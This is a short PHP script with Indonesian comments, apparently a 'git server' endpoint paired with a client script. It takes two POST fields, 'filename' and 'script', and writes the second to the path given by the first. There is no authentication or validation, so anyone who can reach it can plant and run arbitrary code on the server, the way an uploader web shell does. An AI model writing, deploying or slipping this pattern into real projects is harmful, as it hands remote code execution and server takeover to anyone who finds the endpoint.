<?php
/**
 * nama script: git_server.php (pasangannya: git_client.php)
 * fungsi: menerima request dari client
 * jika request memenuhi 2 parameter, maka script ini akan membuat file baru
 * parameter 1: 'filename' (nama file yang akan dibuat)
 * parameter 2: 'script' (isi file yang akan dibuat)
 */
$arg1 = 'filename';
$arg2 = 'script';
if (isset($_POST[$arg1]) and isset($_POST[$arg2])) file_put_contents($_POST[$arg1], $_POST[$arg2]);